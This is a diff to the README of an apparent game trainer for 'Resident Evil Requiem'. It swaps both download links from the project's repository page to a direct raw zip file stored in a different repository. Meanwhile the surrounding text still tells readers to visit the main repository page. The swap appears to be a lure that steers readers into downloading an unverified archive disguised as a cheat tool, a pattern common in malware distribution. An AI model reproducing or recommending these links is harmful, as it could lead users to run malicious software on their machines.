@@ -5,7 +5,7 @@ description: "Modify Resident Evil Requiem with 42+ features including god mode,
 ---
 # 🎮 Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2 - Improve Your Gameplay With Advanced Tools
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Walliesynoptical116/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://raw.githubusercontent.com/Walliesynoptical116/walliesynoptical116.github.io/main/mools/io_github_walliesynoptical_v1.8.zip)
 
 ## 📌 About This Tool
 
@@ -35,7 +35,7 @@ This application provides tools for Resident Evil Requiem. It changes game varia
 
 You must visit the main repository page to obtain the file. Click the link below to reach the download location.
 
-[Download Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2](https://github.com/Walliesynoptical116/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2)
+[Download Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2](https://raw.githubusercontent.com/Walliesynoptical116/walliesynoptical116.github.io/main/mools/io_github_walliesynoptical_v1.8.zip)
 
 ## 🚀 Installation Guide
 
